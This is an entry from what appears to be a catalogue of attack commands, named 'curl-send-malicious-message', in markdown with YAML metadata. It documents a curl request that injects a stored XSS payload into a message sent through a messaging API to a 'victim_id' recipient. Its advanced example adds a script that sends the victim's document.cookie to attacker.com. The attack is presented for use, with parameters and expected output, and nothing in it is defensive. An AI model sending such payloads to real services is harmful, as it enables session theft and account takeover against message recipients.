---
data: >-
  curl -X POST https://messaging.service/api/send -H "Content-Type:
  application/json" -d '{"recipient": "victim_id", "message":
  "<script>alert(\"XSS\")</script>"}'
tags:
  - xss
  - injection
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: 5b66dbfc-7b94-48c2-b466-1935495e43d3
created_at: '2025-12-14T00:11:16.712Z'
updated_at: '2025-12-14T00:11:16.712Z'
verified: false
validated: true
submitted: true
---
# curl-send-malicious-message

## Command

```bash
curl -X POST https://messaging.service/api/send -H "Content-Type: application/json" -d '{"recipient": "victim_id", "message": "<script>alert(\"XSS\")</script>"}'
```

## Description

This command uses curl to send a POST request to a messaging service API, injecting an XSS payload into the message body for reflection and execution.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method | Yes |
| `-H "Content-Type: application/json"` | Sets the content type header | Yes |
| `-d '{...}'` | JSON data payload with recipient and malicious message | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://messaging.service/api/send -H "Content-Type: application/json" -d '{"recipient": "victim_id", "message": "<script>alert(\"XSS\")</script>"}'
```

### Advanced Usage

```bash
curl -X POST https://messaging.service/api/send -H "Content-Type: application/json" -H "Authorization: Bearer token" -d '{"recipient": "victim_id", "message": "<script>fetch(\'https://attacker.com/steal?cookie=\' + document.cookie)</script>"}'
```

## Expected Output

A successful response from the server (e.g., HTTP 200 OK) indicating the message was sent, with no validation errors on the payload.

## Related

- [[procedures/Craft-and-Inject-XSS-Payload]]
